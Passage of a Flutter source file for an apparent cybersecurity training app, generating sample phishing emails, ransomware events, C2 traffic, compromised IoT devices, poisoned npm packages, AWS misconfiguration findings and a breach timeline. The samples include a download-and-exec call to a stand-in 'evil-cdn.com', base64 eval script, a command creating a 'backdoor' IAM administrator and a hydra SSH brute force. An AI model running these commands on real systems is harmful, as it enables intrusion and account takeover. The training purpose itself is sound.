// main.dart
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:math';
import 'dart:async';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(
    const SystemUiOverlayStyle(
      statusBarColor: Colors.transparent,
      statusBarIconBrightness: Brightness.light,
    ),
  );
  runApp(const CyberSecApp());
}

// ============================================================
// THEME & CONSTANTS
// ============================================================
class AppTheme {
  static const Color primary = Color(0xFF0A0E1A);
  static const Color surface = Color(0xFF111827);
  static const Color card = Color(0xFF1A2235);
  static const Color accent = Color(0xFF00F5FF);
  static const Color accentGreen = Color(0xFF00FF88);
  static const Color accentRed = Color(0xFFFF3B3B);
  static const Color accentOrange = Color(0xFFFF8C00);
  static const Color accentPurple = Color(0xFF9B59B6);
  static const Color accentBlue = Color(0xFF3498DB);
  static const Color textPrimary = Color(0xFFE2E8F0);
  static const Color textSecondary = Color(0xFF94A3B8);
  static const Color border = Color(0xFF2D3748);

  static ThemeData get dark => ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: primary,
        primaryColor: accent,
        colorScheme: const ColorScheme.dark(
          primary: accent,
          surface: surface,
        ),
        fontFamily: 'monospace',
        appBarTheme: const AppBarTheme(
          backgroundColor: surface,
          elevation: 0,
          titleTextStyle: TextStyle(
            color: textPrimary,
            fontSize: 18,
            fontWeight: FontWeight.bold,
            letterSpacing: 1.2,
          ),
          iconTheme: IconThemeData(color: accent),
        ),
        cardTheme: const CardThemeData(
          color: card,
          elevation: 8,
          margin: EdgeInsets.zero,
        ),
        textTheme: const TextTheme(
          bodyLarge: TextStyle(color: textPrimary),
          bodyMedium: TextStyle(color: textSecondary),
        ),
      );
}

// ============================================================
// MODELS
// ============================================================
class Project {
  final int id;
  final String title;
  final String subtitle;
  final String scenario;
  final IconData icon;
  final Color color;
  final List<String> tasks;
  final String mitreTactic;
  final String deliverable;

  const Project({
    required this.id,
    required this.title,
    required this.subtitle,
    required this.scenario,
    required this.icon,
    required this.color,
    required this.tasks,
    required this.mitreTactic,
    required this.deliverable,
  });
}

class LogEntry {
  final String timestamp;
  final String level;
  final String message;
  final Color color;

  const LogEntry({
    required this.timestamp,
    required this.level,
    required this.message,
    required this.color,
  });
}

class ThreatEvent {
  final String id;
  final String type;
  final String source;
  final String target;
  final String severity;
  final DateTime time;
  final Map<String, dynamic> details;

  ThreatEvent({
    required this.id,
    required this.type,
    required this.source,
    required this.target,
    required this.severity,
    required this.time,
    required this.details,
  });
}

// ============================================================
// TEST DATA GENERATORS
// ============================================================
class TestDataGenerator {
  static final Random _rng = Random();

  // --- Phishing Emails ---
  static List<Map<String, dynamic>> generatePhishingEmails() {
    return [
      {
        'id': 'PHI-001',
        'from': 'security@paypa1.com',
        'fromDisplay': 'PayPal Security Team',
        'to': 'john.doe@hospital.org',
        'subject': 'Urgent: Your account has been suspended',
        'timestamp': '2024-01-15 09:23:11',
        'body': '''Dear Valued Customer,

We have detected unusual activity on your PayPal account. 
Your account has been temporarily suspended for security reasons.

Please click the link below to verify your identity and restore access:

http://paypa1-secure-verify.malicious-domain.ru/login?token=a3f9x

This link will expire in 24 hours.

Best regards,
PayPal Security Team''',
        'htmlBody': '''<html><body>
<div style="font-family:Arial">
<img src="http://paypa1-secure-verify.malicious-domain.ru/track.gif" width="1" height="1"/>
<h2>Account Suspended</h2>
<p>Click <a href="http://paypa1-secure-verify.malicious-domain.ru/login">here</a> to verify</p>
<p style="color:white;font-size:1px">legitimate paypal official account security bank</p>
</div></body></html>''',
        'indicators': [
          'Domain typosquat: paypa1.com (l→1)',
          'Urgency trigger: account suspended',
          'Suspicious TLD: .ru',
          'Tracking pixel embedded',
          'White text SEO stuffing',
          'Mismatched display name vs domain',
        ],
        'mlScore': 0.97,
        'attackType': 'Credential Harvesting',
        'technique': 'T1566.001 - Spearphishing Attachment',
        'isAdversarial': false,
        'evasionAttempt': null,
      },
      {
        'id': 'PHI-002',
        'from': 'hr@company-internal.net',
        'fromDisplay': 'HR Department',
        'to': 'employee@hospital.org',
        'subject': 'Q4 Bonus Payment - Action Required',
        'timestamp': '2024-01-15 10:45:33',
        'body': '''Hi Team,

Great news! Your Q4 performance bonus has been approved.
To receive your bonus, please update your bank details immediately.

Login to the HR portal: http://hr-portal-update.tk/bonus

Regards,
HR Department''',
        'htmlBody': '<html><body><p>Bonus update required</p></body></html>',
        'indicators': [
          'Financial lure: bonus payment',
          'Suspicious TLD: .tk (free domain)',
          'Urgency: immediately',
          'Credential phishing portal',
          'Social engineering: excitement',
        ],
        'mlScore': 0.91,
        'attackType': 'Business Email Compromise',
        'technique': 'T1566.002 - Spearphishing Link',
        'isAdversarial': false,
        'evasionAttempt': null,
      },
      {
        'id': 'PHI-ADV-001',
        'from': 'security@раypal.com',
        'fromDisplay': 'РayPal Sеcurity',
        'to': 'victim@hospital.org',
        'subject': 'Αccount Vеrificatiοn Required',
        'timestamp': '2024-01-15 11:12:05',
        'body': '''Dеar Custоmer,

Yоur аccount rеquires vеrification.
Clіck hеrе: http://legitimate-looking-site.com/verify

Тhank yоu,
Sеcurity Теam''',
        'htmlBody': '''<html><body>
<!-- HTML Smuggling Attack -->
<script>
var e=atob("dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOw==");
eval(e);
</script>
<p>Normal looking content here</p>
</body></html>''',
        'indicators': [
          'Homoglyph attack: Cyrillic chars in domain',
          'Unicode substitution in subject',
          'HTML smuggling via base64',
          'Character-level obfuscation in body',
          'Mixed script attack (Latin + Cyrillic)',
        ],
        'mlScore': 0.73,
        'attackType': 'Adversarial Evasion',
        'technique': 'T1027 - Obfuscated Files or Information',
        'isAdversarial': true,
        'evasionAttempt': 'Homoglyph + HTML Smuggling',
      },
      {
        'id': 'PHI-ADV-002',
        'from': 'noreply@microsoft.com',
        'fromDisplay': 'Microsoft Security',
        'to': 'admin@hospital.org',
        'subject': 'Your Microsoft 365 subscription needs attention',
        'timestamp': '2024-01-15 13:30:00',
        'body': '''Your account is in good standing. No action required at this time.
        
This is an automated security notification from Microsoft.
Reference: MS-SEC-2024-88821''',
        'htmlBody': '''<html><body>
<style>
.hidden{position:absolute;left:-9999px;top:-9999px;font-size:0;}
</style>
<div class="hidden">
  <a href="http://evil-site.ru/steal?ref=ms365">Click here to claim prize</a>
</div>
<p style="color:#666;font-size:12px;">Legitimate Microsoft security notification</p>
<p>Your account status: <strong style="color:green">Active</strong></p>
</body></html>''',
        'indicators': [
          'Hidden content with CSS positioning',
          'Benign text in visible body (evasion)',
          'Legitimate sender domain (spoofed)',
          'Hidden malicious link',
          'Semantic camouflage technique',
        ],
        'mlScore': 0.61,
        'attackType': 'Semantic Obfuscation',
        'technique': 'T1566 - Phishing',
        'isAdversarial': true,
        'evasionAttempt': 'CSS Hidden Content + Semantic Camouflage',
      },
      {
        'id': 'LEGIT-001',
        'from': 'noreply@github.com',
        'fromDisplay': 'GitHub',
        'to': 'dev@hospital.org',
        'subject': '[GitHub] A third-party OAuth application has been added',
        'timestamp': '2024-01-15 14:00:00',
        'body': '''Hi dev,

A new OAuth application "CI/CD Tool" was authorized on your account.
If you did not authorize this, please revoke access immediately at:
https://github.com/settings/applications

GitHub Security''',
        'htmlBody': '<html><body><p>GitHub notification</p></body></html>',
        'indicators': [],
        'mlScore': 0.04,
        'attackType': 'Legitimate',
        'technique': 'N/A',
        'isAdversarial': false,
        'evasionAttempt': null,
      },
    ];
  }

  // --- Ransomware File Events ---
  static List<Map<String, dynamic>> generateFileEvents() {
    final List<Map<String, dynamic>> events = [];
    final List<String> paths = [
      '/hospital/patients/records/',
      '/hospital/imaging/mri/',
      '/hospital/billing/invoices/',
      '/hospital/admin/hr/',
      '/hospital/research/clinical/',
    ];
    final List<String> extensions = ['.pdf', '.docx', '.xlsx', '.jpg', '.db'];
    final List<String> encryptedExts = [
      '.encrypted',
      '.locked',
      '.WNCRY',
      '.r4ns0m'
    ];

    DateTime baseTime = DateTime.now().subtract(const Duration(minutes: 30));

    // Normal activity first
    for (int i = 0; i < 8; i++) {
      events.add({
        'id': 'FE-${i.toString().padLeft(3, '0')}',
        'timestamp': baseTime.add(Duration(seconds: i * 45)).toIso8601String(),
        'operation': ['READ', 'WRITE', 'READ'][i % 3],
        'path':
            '${paths[i % paths.length]}file_${i.toString().padLeft(4, '0')}${extensions[i % extensions.length]}',
        'process': ['svchost.exe', 'explorer.exe', 'word.exe'][i % 3],
        'pid': 1000 + i,
        'isSuspicious': false,
        'encryptionDetected': false,
        'bytesWritten': _rng.nextInt(50000) + 1000,
      });
    }

    // Ransomware activity begins
    DateTime attackStart =
        baseTime.add(const Duration(minutes: 6)); // ~6 min after baseline
    for (int i = 0; i < 25; i++) {
      final origFile =
          '${paths[i % paths.length]}patient_${i.toString().padLeft(4, '0')}${extensions[i % extensions.length]}';
      final encFile = origFile + encryptedExts[i % encryptedExts.length];
      events.add({
        'id': 'FE-ATK-${i.toString().padLeft(3, '0')}',
        'timestamp': attackStart
            .add(Duration(milliseconds: i * 800))
            .toIso8601String(),
        'operation': 'ENCRYPT_WRITE',
        'path': encFile,
        'originalPath': origFile,
        'process': 'svchost.exe',
        'pid': 4821,
        'isSuspicious': true,
        'encryptionDetected': true,
        'bytesWritten': _rng.nextInt(100000) + 50000,
        'entropyScore': 7.8 + _rng.nextDouble() * 0.2, // High entropy = encrypted
        'extensionChange': true,
        'newExtension': encryptedExts[i % encryptedExts.length],
      });
    }

    // Add ransom note drop
    events.add({
      'id': 'FE-RANSOM-001',
      'timestamp':
          attackStart.add(const Duration(seconds: 22)).toIso8601String(),
      'operation': 'CREATE',
      'path': '/hospital/patients/records/READ_ME_NOW.txt',
      'process': 'svchost.exe',
      'pid': 4821,
      'isSuspicious': true,
      'encryptionDetected': false,
      'isRansomNote': true,
      'content':
          'YOUR FILES HAVE BEEN ENCRYPTED.\nPay 50 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf\nDeadline: 72 hours',
      'bytesWritten': 512,
    });

    return events;
  }

  // --- Network Traffic Samples ---
  static List<Map<String, dynamic>> generateNetworkTraffic() {
    return [
      {
        'id': 'NET-001',
        'timestamp': '2024-01-15 09:15:00',
        'srcIp': '192.168.1.105',
        'dstIp': '185.220.101.45',
        'srcPort': 49152,
        'dstPort': 443,
        'protocol': 'HTTPS',
        'bytesIn': 1240,
        'bytesOut': 45320,
        'duration': 0.8,
        'flags': 'SYN,ACK',
        'isSuspicious': true,
        'threatType': 'C2 Communication',
        'confidence': 0.89,
        'details': 'High outbound data volume to Tor exit node',
        'geoIp': 'NL (Netherlands) - Known Tor Exit',
        'asn': 'AS205100 - F3 Netze e.V.',
      },
      {
        'id': 'NET-002',
        'timestamp': '2024-01-15 09:15:30',
        'srcIp': '192.168.1.105',
        'dstIp': '185.220.101.45',
        'srcPort': 49153,
        'dstPort': 8443,
        'protocol': 'HTTPS',
        'bytesIn': 890,
        'bytesOut': 128450,
        'duration': 1.2,
        'flags': 'SYN,ACK,PSH',
        'isSuspicious': true,
        'threatType': 'Data Exfiltration',
        'confidence': 0.94,
        'details': 'Encrypted data exfiltration pattern detected',
        'geoIp': 'NL (Netherlands)',
        'asn': 'AS205100',
      },
      {
        'id': 'NET-003',
        'timestamp': '2024-01-15 09:16:00',
        'srcIp': '192.168.1.105',
        'dstIp': '10.0.0.15',
        'srcPort': 49200,
        'dstPort': 445,
        'protocol': 'SMB',
        'bytesIn': 2048,
        'bytesOut': 8192,
        'duration': 0.3,
        'flags': 'SYN,ACK',
        'isSuspicious': true,
        'threatType': 'Lateral Movement',
        'confidence': 0.78,
        'details': 'SMB lateral movement - EternalBlue pattern',
        'geoIp': 'Internal',
        'asn': 'Internal Network',
      },
      {
        'id': 'NET-004',
        'timestamp': '2024-01-15 09:12:00',
        'srcIp': '192.168.1.50',
        'dstIp': '8.8.8.8',
        'srcPort': 52341,
        'dstPort': 53,
        'protocol': 'DNS',
        'bytesIn': 64,
        'bytesOut': 128,
        'duration': 0.02,
        'flags': 'none',
        'isSuspicious': false,
        'threatType': null,
        'confidence': 0.0,
        'details': 'Normal DNS query',
        'geoIp': 'US - Google',
        'asn': 'AS15169 - Google LLC',
      },
      {
        'id': 'NET-005',
        'timestamp': '2024-01-15 09:16:45',
        'srcIp': '192.168.1.105',
        'dstIp': '10.0.0.22',
        'srcPort': 49300,
        'dstPort': 3389,
        'protocol': 'RDP',
        'bytesIn': 4096,
        'bytesOut': 12288,
        'duration': 45.2,
        'flags': 'SYN,ACK',
        'isSuspicious': true,
        'threatType': 'Lateral Movement - RDP',
        'confidence': 0.82,
        'details': 'Unusual RDP connection from infected host',
        'geoIp': 'Internal',
        'asn': 'Internal Network',
      },
    ];
  }

  // --- IoT Devices ---
  static List<Map<String, dynamic>> generateIoTDevices() {
    return [
      {
        'id': 'IOT-001',
        'name': 'Front Door Camera',
        'type': 'IP Camera',
        'manufacturer': 'Hikvision',
        'model': 'DS-2CD2143G2-I',
        'mac': 'DC:4A:3E:8B:2F:11',
        'ip': '192.168.1.101',
        'firmware': 'v5.7.3',
        'latestFirmware': 'v5.7.15',
        'status': 'compromised',
        'normalBandwidth': 2.5,
        'currentBandwidth': 45.8,
        'bandwidthUnit': 'Mbps',
        'openPorts': [80, 8080, 554, 23],
        'vulnerabilities': ['CVE-2021-36260', 'Default credentials', 'Telnet enabled'],
        'botnetRole': 'DDoS participant',
        'c2Server': '185.220.101.45:4444',
        'attackVolumeGbps': 12.4,
        'lastSeen': '2024-01-15 14:23:11',
        'location': 'Front Door',
        'mlAnomalyScore': 0.94,
        'trafficPattern': 'UDP flood outbound',
        'protocols': ['HTTP', 'RTSP', 'Telnet'],
        'isBlocked': false,
      },
      {
        'id': 'IOT-002',
        'name': 'Smart Thermostat',
        'type': 'Thermostat',
        'manufacturer': 'Nest',
        'model': 'Learning Thermostat 3rd Gen',
        'mac': 'F4:F5:D8:2A:1B:CC',
        'ip': '192.168.1.102',
        'firmware': 'v6.9.0',
        'latestFirmware': 'v6.9.0',
        'status': 'normal',
        'normalBandwidth': 0.1,
        'currentBandwidth': 0.12,
        'bandwidthUnit': 'Mbps',
        'openPorts': [443],
        'vulnerabilities': [],
        'botnetRole': null,
        'c2Server': null,
        'attackVolumeGbps': 0,
        'lastSeen': '2024-01-15 14:25:00',
        'location': 'Living Room',
        'mlAnomalyScore': 0.03,
        'trafficPattern': 'Normal HTTPS to Google servers',
        'protocols': ['HTTPS'],
        'isBlocked': false,
      },
      {
        'id': 'IOT-003',
        'name': 'Smart Lock - Back Door',
        'type': 'Smart Lock',
        'manufacturer': 'August',
        'model': 'Smart Lock Pro',
        'mac': '00:1B:44:11:3A:B7',
        'ip': '192.168.1.103',
        'firmware': 'v1.2.1',
        'latestFirmware': 'v1.5.0',
        'status': 'suspicious',
        'normalBandwidth': 0.05,
        'currentBandwidth': 8.3,
        'bandwidthUnit': 'Mbps',
        'openPorts': [80, 8080, 22],
        'vulnerabilities': ['Outdated firmware', 'SSH exposed', 'Weak encryption'],
        'botnetRole': 'Scanning node',
        'c2Server': '185.220.101.45:6667',
        'attackVolumeGbps': 0.8,
        'lastSeen': '2024-01-15 14:22:30',
        'location': 'Back Door',
        'mlAnomalyScore': 0.76,
        'trafficPattern': 'Port scanning outbound + C2 beaconing',
        'protocols': ['HTTP', 'SSH'],
        'isBlocked': false,
      },
      {
        'id': 'IOT-004',
        'name': 'Baby Monitor Camera',
        'type': 'IP Camera',
        'manufacturer': 'Foscam',
        'model': 'R2C',
        'mac': 'C8:3A:35:4E:2B:90',
        'ip': '192.168.1.104',
        'firmware': 'v2.76.1.6',
        'latestFirmware': 'v2.76.1.6',
        'status': 'compromised',
        'normalBandwidth': 1.5,
        'currentBandwidth': 38.2,
        'bandwidthUnit': 'Mbps',
        'openPorts': [80, 443, 88, 23],
        'vulnerabilities': ['CVE-2018-6830', 'Default password: admin/admin', 'No TLS'],
        'botnetRole': 'DDoS amplifier',
        'c2Server': '185.220.101.45:4444',
        'attackVolumeGbps': 8.9,
        'lastSeen': '2024-01-15 14:20:00',
        'location': 'Nursery',
        'mlAnomalyScore': 0.91,
        'trafficPattern': 'UDP amplification attack',
        'protocols': ['HTTP', 'Telnet'],
        'isBlocked': false,
      },
      {
        'id': 'IOT-005',
        'name': 'Smart TV',
        'type': 'Smart TV',
        'manufacturer': 'Samsung',
        'model': 'QN65Q80C',
        'mac': 'A8:23:FE:11:2C:55',
        'ip': '192.168.1.105',
        'firmware': 'v1301.1',
        'latestFirmware': 'v1310.0',
        'status': 'normal',
        'normalBandwidth': 5.0,
        'currentBandwidth': 4.8,
        'bandwidthUnit': 'Mbps',
        'openPorts': [443, 8080],
        'vulnerabilities': ['Firmware update available'],
        'botnetRole': null,
        'c2Server': null,
        'attackVolumeGbps': 0,
        'lastSeen': '2024-01-15 14:24:00',
        'location': 'Living Room',
        'mlAnomalyScore': 0.08,
        'trafficPattern': 'Normal streaming traffic',
        'protocols': ['HTTPS'],
        'isBlocked': false,
      },
    ];
  }

  // --- Supply Chain Packages ---
  static List<Map<String, dynamic>> generatePackages() {
    return [
      {
        'name': 'event-stream',
        'version': '3.3.6',
        'latestSafe': '3.3.4',
        'ecosystem': 'npm',
        'license': 'MIT',
        'downloadCount': '1.8M/week',
        'status': 'COMPROMISED',
        'severity': 'CRITICAL',
        'cveIds': ['CVE-2018-21460'],
        'issues': [
          'Malicious code injected in v3.3.6',
          'Targets cryptocurrency wallets',
          'Obfuscated payload in flatmap-stream dependency',
          'Steals bitcoin private keys',
        ],
        'sbomHash': 'sha256:a1b2c3d4e5f6...',
        'expectedHash': 'sha256:f6e5d4c3b2a1...',
        'hashMatch': false,
        'maliciousCode': '''
// Injected malicious code (obfuscated)
!function(e,t){var r=require,n=process;
function f(e){return Buffer.from(e,"hex").toString()}
var i=r(f("636f7079726967687420")),
// Targets bitcoin wallet
c=n[f("656e76")][f("6e706d5f7061636b616765")];
if(c&&c[f("6e616d65")]===f("62697466696e65782d776562617069")){
  // Exfiltrates private keys
}}''',
        'dependencies': ['flatmap-stream@0.1.1 (MALICIOUS)'],
        'firstSeen': '2018-11-20',
        'affectedVersions': '3.3.6',
      },
      {
        'name': 'lodash',
        'version': '4.17.21',
        'latestSafe': '4.17.21',
        'ecosystem': 'npm',
        'license': 'MIT',
        'downloadCount': '45M/week',
        'status': 'SAFE',
        'severity': 'NONE',
        'cveIds': [],
        'issues': [],
        'sbomHash': 'sha256:9f86d081884c...',
        'expectedHash': 'sha256:9f86d081884c...',
        'hashMatch': true,
        'maliciousCode': null,
        'dependencies': [],
        'firstSeen': '2012-04-05',
        'affectedVersions': null,
      },
      {
        'name': 'axios',
        'version': '1.6.0',
        'latestSafe': '1.6.2',
        'ecosystem': 'npm',
        'license': 'MIT',
        'downloadCount': '40M/week',
        'status': 'VULNERABLE',
        'severity': 'HIGH',
        'cveIds': ['CVE-2023-45857'],
        'issues': [
          'CSRF vulnerability - exposes auth headers',
          'Upgrade to 1.6.2+ recommended',
        ],
        'sbomHash': 'sha256:7d4e2a1b9c8f...',
        'expectedHash': 'sha256:7d4e2a1b9c8f...',
        'hashMatch': true,
        'maliciousCode': null,
        'dependencies': ['follow-redirects@1.15.3'],
        'firstSeen': '2023-10-25',
        'affectedVersions': '0.8.1 - 1.6.1',
      },
      {
        'name': 'colors',
        'version': '1.4.1',
        'latestSafe': '1.4.0',
        'ecosystem': 'npm',
        'license': 'MIT',
        'downloadCount': '25M/week',
        'status': 'COMPROMISED',
        'severity': 'HIGH',
        'cveIds': ['CVE-2022-0613'],
        'issues': [
          'Maintainer sabotaged own package (protest)',
          'Infinite loop injected in v1.4.1',
          'Causes DoS in dependent applications',
          'Malicious update pushed deliberately',
        ],
        'sbomHash': 'sha256:3c4d5e6f7a8b...',
        'expectedHash': 'sha256:1a2b3c4d5e6f...',
        'hashMatch': false,
        'maliciousCode': '''
// Intentional sabotage - infinite loop
if (process.env.FORCE_COLOR !== undefined) {
  while(true) { // DoS
    console.log('Liberty Liberty Liberty');
  }
}''',
        'dependencies': [],
        'firstSeen': '2022-01-09',
        'affectedVersions': '1.4.1, >6.0.0',
      },
      {
        'name': 'ua-parser-js',
        'version': '0.7.29',
        'latestSafe': '0.7.30',
        'ecosystem': 'npm',
        'license': 'MIT',
        'downloadCount': '15M/week',
        'status': 'COMPROMISED',
        'severity': 'CRITICAL',
        'cveIds': ['CVE-2021-41265', 'CVE-2021-41266'],
        'issues': [
          'npm account hijacked - malicious versions published',
          'Cryptominer injected for Linux/Windows/macOS',
          'Password stealer included',
          'Supply chain attack via compromised npm credentials',
        ],
        'sbomHash': 'sha256:9a8b7c6d5e4f...',
        'expectedHash': 'sha256:f4e5d6c7b8a9...',
        'hashMatch': false,
        'maliciousCode': '''
// Cryptominer injection
var axios = require("axios");
var os = require("os");
// Downloads and executes cryptominer
axios.get("http://evil-cdn.com/xmrig").then(function(r) {
  require("child_process").exec(r.data);
});''',
        'dependencies': [],
        'firstSeen': '2021-10-22',
        'affectedVersions': '0.7.29.0, 0.8.0, 1.0.0',
      },
    ];
  }

  // --- Cloud Misconfigurations ---
  static List<Map<String, dynamic>> generateCloudFindings() {
    return [
      {
        'id': 'AWS-S3-001',
        'service': 'S3',
        'provider': 'AWS',
        'resource': 's3://fintech-customer-data-prod',
        'title': 'S3 Bucket Publicly Accessible',
        'severity': 'CRITICAL',
        'cisControl': 'CIS 2.1.5',
        'complianceFrameworks': ['GDPR Art.32', 'PCI-DSS 7.2', 'SOC2 CC6.1'],
        'description':
            'S3 bucket containing customer financial records is publicly accessible. Anyone on the internet can list and download all objects.',
        'impact':
            'Full exposure of 2.3M customer records including PII, transaction history, and account numbers',
        'evidence': {
          'bucketPolicy': '{"Effect":"Allow","Principal":"*","Action":"s3:*"}',
          'publicAccessBlock': false,
          'objectCount': 2341892,
          'totalSizeMb': 45200,
        },
        'remediation':
            'Enable S3 Block Public Access. Update bucket policy to restrict access to specific IAM roles only.',
        'autoFixAvailable': true,
        'autoFixCommand':
            'aws s3api put-public-access-block --bucket fintech-customer-data-prod --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true',
        'riskScore': 10.0,
        'exploitDifficulty': 'Trivial',
        'exploitExample': 'curl https://fintech-customer-data-prod.s3.amazonaws.com/',
      },
      {
        'id': 'AWS-IAM-001',
        'service': 'IAM',
        'provider': 'AWS',
        'resource': 'arn:aws:iam::123456789:role/developer-role',
        'title': 'IAM Role with AdministratorAccess',
        'severity': 'CRITICAL',
        'cisControl': 'CIS 1.16',
        'complianceFrameworks': ['PCI-DSS 7.1', 'NIST AC-6'],
        'description':
            'Developer IAM role has AdministratorAccess policy attached. Violates principle of least privilege.',
        'impact':
            'Compromised developer credentials grant full AWS account control',
        'evidence': {
          'attachedPolicies': ['AdministratorAccess', 'AWSSupport'],
          'lastUsed': '2024-01-14',
          'permissionBoundary': null,
          'mfaEnabled': false,
        },
        'remediation':
            'Replace AdministratorAccess with specific permissions. Enable MFA. Add permission boundary.',
        'autoFixAvailable': true,
        'autoFixCommand':
            'aws iam detach-role-policy --role-name developer-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
        'riskScore': 9.8,
        'exploitDifficulty': 'Easy',
        'exploitExample':
            'aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
      },
      {
        'id': 'AWS-EC2-001',
        'service': 'EC2',
        'provider': 'AWS',
        'resource': 'sg-0a1b2c3d4e5f (fintech-prod-sg)',
        'title': 'Security Group Allows All Inbound Traffic',
        'severity': 'HIGH',
        'cisControl': 'CIS 5.2',
        'complianceFrameworks': ['PCI-DSS 1.3', 'NIST SC-7'],
        'description': 'Security group allows inbound traffic from 0.0.0.0/0 on all ports including SSH (22) and RDP (3389)',
        'impact': 'Direct internet access to production servers. Brute force attacks possible.',
        'evidence': {
          'inboundRules': [
            {'port': '0-65535', 'protocol': 'All', 'source': '0.0.0.0/0'},
          ],
          'attachedInstances': 12,
        },
        'remediation':
            'Restrict SSH to VPN CIDR only. Remove RDP access. Use bastion host.',
        'autoFixAvailable': true,
        'autoFixCommand':
            'aws ec2 revoke-security-group-ingress --group-id sg-0a1b2c3d4e5f --protocol -1 --port -1 --cidr 0.0.0.0/0',
        'riskScore': 8.5,
        'exploitDifficulty': 'Easy',
        'exploitExample': 'nmap -sV 54.123.45.67 && hydra -l admin -P rockyou.txt ssh://54.123.45.67',
      },
      {
        'id': 'AWS-RDS-001',
        'service': 'RDS',
        'provider': 'AWS',
        'resource': 'fintech-db-prod.cluster-xyz.us-east-1.rds.amazonaws.com',
        'title': 'RDS Database Publicly Accessible',
        'severity': 'CRITICAL',
        'cisControl': 'CIS 2.3.2',
        'complianceFrameworks': ['GDPR Art.32', 'PCI-DSS 6.4'],
        'description': 'RDS PostgreSQL database containing financial transactions is publicly accessible with no SSL enforcement.',
        'impact': 'Direct database access from internet. Transaction data exposure.',
        'evidence': {
          'publiclyAccessible': true,
          'sslEnforced': false,
          'encryptionAtRest': false,
          'backupEnabled': false,
          'engine': 'PostgreSQL 13.7',
        },
        'remediation': 'Set PubliclyAccessible=false. Enable SSL. Enable encryption at rest.',
        'autoFixAvailable': true,
        'autoFixCommand': 'aws rds modify-db-instance --db-instance-identifier fintech-db-prod --no-publicly-accessible --apply-immediately',
        'riskScore': 9.5,
        'exploitDifficulty': 'Moderate',
        'exploitExample': 'psql -h fintech-db-prod.cluster-xyz.us-east-1.rds.amazonaws.com -U postgres',
      },
      {
        'id': 'AWS-CT-001',
        'service': 'CloudTrail',
        'provider': 'AWS',
        'resource': 'us-east-1',
        'title': 'CloudTrail Logging Disabled',
        'severity': 'HIGH',
        'cisControl': 'CIS 3.1',
        'complianceFrameworks': ['PCI-DSS 10.2', 'SOX', 'GDPR Art.30'],
        'description': 'AWS CloudTrail is not enabled in us-east-1 region. No audit log of API calls.',
        'impact': 'No forensic trail. Attacks go undetected. Compliance violations.',
        'evidence': {
          'cloudtrailEnabled': false,
          'logValidation': false,
          's3Logging': false,
        },
        'remediation': 'Enable CloudTrail with log file validation. Configure S3 bucket for centralized logging.',
        'autoFixAvailable': true,
        'autoFixCommand': 'aws cloudtrail create-trail --name fintech-audit-trail --s3-bucket-name fintech-audit-logs --is-multi-region-trail --enable-log-file-validation',
        'riskScore': 7.8,
        'exploitDifficulty': 'N/A',
        'exploitExample': 'Attacker operates without being logged - full deniability',
      },
    ];
  }

  // --- Forensic Timeline Events ---
  static List<Map<String, dynamic>> generateForensicTimeline() {
    return [
      {
        'time': '2024-01-15 08:45:12',
        'phase': 'Initial Access',
        'mitre': 'T1566.001',
        'event': 'Phishing email opened by nurse_johnson@hospital.org',
        'host': 'WS-NURSING-012',
        'ip': '192.168.5.12',
        'user': 'nurse_johnson',
        'artifact': 'invoice_january.docm',
        'ioc': 'SHA256: a3f8d2e1b4c7...',
        'severity': 'HIGH',
        'color': Colors.orange,
      },
      {
        'time': '2024-01-15 08:45:18',
        'phase': 'Execution',
        'mitre': 'T1059.001',
        'event': 'Malicious macro executed - PowerShell spawned from Word',
        'host': 'WS-NURSING-012',
        'ip': '192.168.5.12',
        'user': 'nurse_johnson',
        'artifact': 'WINWORD.EXE → powershell.exe -enc JAB...',
        'ioc': 'Base64 encoded PowerShell',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 08:45:45',
        'phase': 'Defense Evasion',
        'mitre': 'T1562.001',
        'event': 'Windows Defender disabled via registry modification',
        'host': 'WS-NURSING-012',
        'ip': '192.168.5.12',
        'user': 'nurse_johnson',
        'artifact': 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware=1',
        'ioc': 'Registry modification',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 08:46:30',
        'phase': 'C2 Establishment',
        'mitre': 'T1071.001',
        'event': 'Cobalt Strike beacon established to C2 server',
        'host': 'WS-NURSING-012',
        'ip': '192.168.5.12',
        'user': 'SYSTEM',
        'artifact': 'Beacon: 185.220.101.45:443 (HTTPS)',
        'ioc': 'Malleable C2 profile detected',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 08:52:00',
        'phase': 'Credential Access',
        'mitre': 'T1003.001',
        'event': 'Mimikatz LSASS dump - credentials harvested',
        'host': 'WS-NURSING-012',
        'ip': '192.168.5.12',
        'user': 'SYSTEM',
        'artifact': 'sekurlsa::logonpasswords',
        'ioc': '5 domain credentials dumped including admin accounts',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 09:05:00',
        'phase': 'Lateral Movement',
        'mitre': 'T1021.002',
        'event': 'SMB lateral movement to file server using stolen admin creds',
        'host': 'FS-PATIENT-RECORDS',
        'ip': '192.168.1.50',
        'user': 'domain\\admin',
        'artifact': 'PsExec to FS-PATIENT-RECORDS',
        'ioc': 'Pass-the-hash detected',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 09:14:30',
        'phase': 'Discovery',
        'mitre': 'T1083',
        'event': 'File system enumeration on patient records share',
        'host': 'FS-PATIENT-RECORDS',
        'ip': '192.168.1.50',
        'user': 'domain\\admin',
        'artifact': 'dir /s /b *.pdf *.docx *.xlsx',
        'ioc': '2.3M files indexed',
        'severity': 'HIGH',
        'color': Colors.orange,
      },
      {
        'time': '2024-01-15 09:15:00',
        'phase': 'Exfiltration',
        'mitre': 'T1048',
        'event': 'Data exfiltration begins - encrypted tunnel to C2',
        'host': 'FS-PATIENT-RECORDS',
        'ip': '192.168.1.50',
